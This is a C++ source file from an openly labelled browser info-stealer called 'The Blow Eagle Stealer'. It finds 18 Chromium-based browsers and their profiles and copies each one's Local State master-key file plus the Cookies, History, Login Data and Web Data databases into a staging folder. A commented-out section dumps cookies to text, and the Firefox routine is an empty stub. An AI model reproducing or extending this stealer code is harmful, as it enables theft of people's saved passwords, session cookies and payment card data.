/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

#include "../targets.h"
#include "../../config/config.c"
#include "../../helper/helper.h"
#include <fstream>
#include <vector>
#include "../../dependencies/sqlite/sqlite3.h"

/*
#include "Base64.h"
#include "binaryhandler.hpp"
#include <cstdio>
#include <iostream>
#include "json.hpp"
#include <map>
//#include "plusaes_wrapper.hpp"
#include <string>
#include <windows.h>
#include <Wincrypt.h>
#pragma comment(lib, "user32")
#pragma comment(lib, "Crypt32")
*/

namespace global 
{
    std::string user = func::GetUser();
    std::string appdata = "C:/Users/" + user + "/AppData/Local";
    std::string roaming = "C:/Users/" + user + "/AppData/Roaming";
    std::string defaultPath = "C:/Users/" + user + config::path + "/Browsers";

    std::string names[] = {
        "/Amigo",
        "/Torch",
        "/Kometa",
        "/Orbitum",
        "/CentBrowser",
        "/7Star",
        "/Sputnik",
        "/Vivaldi",
        "/Chrome SxS",
        "/Chrome",
        "/Epic Privacy Browser",
        "/Edge",
        "/Uran",
        "/YandexBrowser",
        "/Brave-Browser",
        "/Iridium",
        "/Opera GX",
        "/Opera"
    };
}

int GetCookies(std::string path , std::string profile, int counter);

void GetHistory(std::string path, std::string profile, int counter);

void GetLogins(std::string path, std::string profile, int counter);

void GetCards(std::string path, std::string profile, int counter);

void CopyMasterKey(std::string path, int counter);

void browsers::Chromium()
{
    printf("Chromium\n");


    std::string browsersPaths[] = 
    {
         global::appdata+"/Amigo/User Data",
         global::appdata + "/Torch/User Data",
         global::appdata + "/Kometa/User Data",
         global::appdata + "/Orbitum/User Data",
         global::appdata + "/CentBrowser/User Data",
         global::appdata + "/7Star/7Star/User Data",
         global::appdata + "/Sputnik/Sputnik/User Data",
         global::appdata + "Vivaldi/User Data",
         global::appdata + "/Google/Chrome SxS/User Data",
         global::appdata + "/Google/Chrome/User Data",
         global::appdata + "/Epic Privacy Browser/User Data",
         global::appdata + "/Microsoft/Edge/User Data",
         global::appdata + "/uCozMedia/Uran/User Data",
         global::appdata + "/Yandex/YandexBrowser/User Data",
         global::appdata + "/BraveSoftware/Brave-Browser/User Data",
         global::appdata + "/Iridium/User Data",
         global::roaming + "/Opera Software/Opera GX Stable",
         global::roaming + "/Opera Software/Opera Stable"
    };

    std::string profiles[] = { 
        "Default",
        "Profile 1",
        "Profile 2",
        "Profile 3",
        "Profile 4",
        "Profile 5",
        "Guest Profile"
    };

    int result = _mkdir(global::defaultPath.c_str());

    for (size_t i = 0; i < std::size(browsersPaths); i++)
    {
        if (std::filesystem::exists(browsersPaths[i])) 
        {
            for (size_t j = 0; j < std::size(profiles); j++)
            {
                if (std::filesystem::exists(browsersPaths[i] + "/" + profiles[j]))
                {
                    std::string dir = global::defaultPath + global::names[i];
                    int result = _mkdir(dir.c_str());

                    CopyMasterKey(browsersPaths[i], i);
                    GetCookies (browsersPaths[i], profiles[j], i);
                    GetHistory(browsersPaths[i], profiles[j], i);
                    GetLogins(browsersPaths[i], profiles[j], i);
                    GetCards(browsersPaths[i], profiles[j], i);
                }
            }
        }
    }
}

void browsers::FireFox()
{
    std::string path = global::roaming + "/Mozilla/Firefox";
    //std::string defPaths[] = global::defaultPath + "/Firefox";

    if (std::filesystem::exists(path))
    {

    }
}


void CopyMasterKey(std::string path, int counter)
{
    path += "/Local State";

    func::copyFile(path, global::defaultPath + global::names[counter]);
}


int GetCookies(std::string path, std::string profile, int counter)
{
    // Path to Chrome's cookies database
    std::string cookiesDbPath = path + "/" + profile+ "/Network/Cookies";

    func::copyFile(cookiesDbPath, global::defaultPath + global::names[counter]+ "/Cookies_" + profile);
    /*
    // Open the cookies database
    sqlite3* db;
    int result = sqlite3_open(cookiesDbPath.c_str(), &db);
    if (result != SQLITE_OK) {
        std::cerr << "Failed to open cookies database: " << sqlite3_errmsg(db) << std::endl;
        return 1;
    }

    // SQL query to select cookies
    std::string query = "SELECT * FROM cookies";

    // Execute the query
    sqlite3_stmt* stmt;
    result = sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr);
    if (result != SQLITE_OK) {
        std::cerr << "Failed to execute query: " << sqlite3_errmsg(db) << std::endl;
        sqlite3_close(db);
        return 1;
    }

    // Open the output file for writing
    std::ofstream outputFile("cookies_"+ profile +".txt");
    if (!outputFile.is_open()) {
        std::cerr << "Failed to open output file" << std::endl;
        sqlite3_finalize(stmt);
        sqlite3_close(db);
        return 1;
    }

    // Fetch the results and write cookies to the file
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        // Extract cookie values from the result row
        std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
        std::string value = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));
        std::string domain = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 5));

        // C:\Users\darkd\AppData\Local\Google\Chrome\User Data\Local State
       // std::string domainDec = decrypt_c32(domain);

        // Write the cookie details to the file
        outputFile << "Name: " << name << std::endl;
        outputFile << "Value: " << value << std::endl;
        outputFile << "Domain: " << domain << std::endl;
        outputFile << "-----------------------------" << std::endl << std::endl;
    }

    // Close the output file
    outputFile.close();

    // Close the database connection
    sqlite3_finalize(stmt);
    sqlite3_close(db);

    std::cout << "Cookies exported to cookies.txt" << std::endl;

    return 0;
    */
    return 0;
}

void GetHistory(std::string path, std::string profile, int counter)
{
    std::string cookiesDbPath = path + "/" + profile + "/History";

    func::copyFile(cookiesDbPath, global::defaultPath + global::names[counter] + "/History_" + profile);
}

void GetLogins(std::string path, std::string profile, int counter)
{
    std::string cookiesDbPath = path + "/" + profile + "/Login Data";

    func::copyFile(cookiesDbPath, global::defaultPath + global::names[counter] + "/Login Data_" + profile);
}

void GetCards(std::string path, std::string profile, int counter)
{
    std::string cookiesDbPath = path + "/" + profile + "/Web Data";

    func::copyFile(cookiesDbPath, global::defaultPath + global::names[counter] + "/Web Data_" + profile);
}


